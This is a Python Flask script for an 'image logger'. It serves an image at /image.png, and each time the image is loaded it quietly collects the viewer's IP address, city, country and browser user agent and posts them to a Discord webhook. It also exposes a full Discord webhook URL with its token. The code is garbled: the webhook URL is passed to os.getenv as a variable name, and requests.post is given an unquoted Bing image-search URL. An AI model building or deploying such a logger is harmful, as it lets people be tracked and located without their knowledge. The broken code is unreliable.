from flask import Flask, request, send_file
import requests
import os

app = Flask(__name__)

WEBHOOK_URL = os.getenv("https://discord.com/api/webhooks/1433405919710150707/sUVsS1hKs8aW1edFdzHUJSOrllvMpJc3-LZGmCUM55i8Q4uuC8TPQdpOjqlQxXg8aIGI")  # Put in Render environment

def get_client_ip(req):
    if req.headers.get('X-Forwarded-For'):
        return req.headers['X-Forwarded-For'].split(',')[0].strip()
    return req.remote_addr

def get_geolocation(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return {
            "ip": ip,
            "country": res.get("country", "Unknown"),
            "city": res.get("city", "Unknown")
        }
    except:
        return {"ip": ip, "country": "Unknown", "city": "Unknown"}

def send_to_discord(ip_info, user_agent):
    msg = (
        f"📸 **Image Accessed!**\n\n"
        f"🌍 **IP:** `{ip_info['ip']}`\n"
        f"🏳️ **Country:** {ip_info['country']}\n"
        f"🏙️ **City:** {ip_info['city']}\n"
        f"🧠 **User-Agent:** `{user_agent}`"
    )
    requests.post(https://www.bing.com/images/search?view=detailV2&ccid=SIvLYN7%2f&id=F6A59E1AB616E9CA519B4E19FA07769BBD67D1B7&thid=OIP.SIvLYN7_ZUJnt2sGAUXLKgHaFj&mediaurl=https%3a%2f%2fupload.wikimedia.org%2fwikipedia%2fcommons%2fthumb%2fc%2fc8%2fVery_Black_screen.jpg%2f2560px-Very_Black_screen.jpg&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.488bcb60deff654267b76b060145cb2a%3frik%3dt9FnvZt2B%252foZTg%26pid%3dImgRaw%26r%3d0&exph=1920&expw=2560&q=black+screen&FORM=IRPRST&ck=F5A20D71D3430119A3EDCD7A3433610C&selectedIndex=0&itb=0&ajaxhist=0&ajaxserp=0, json={"content": msg})

@app.route('/image.png')
def serve_image_and_log():
    ip = get_client_ip(request)
    ua = request.headers.get('User-Agent', 'Unknown')
    geo = get_geolocation(ip)
    send_to_discord(geo, ua)
    return send_file('pixel.png', mimetype='image/png')

@app.route('/')
def home():
    return "✅ Image logger online"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
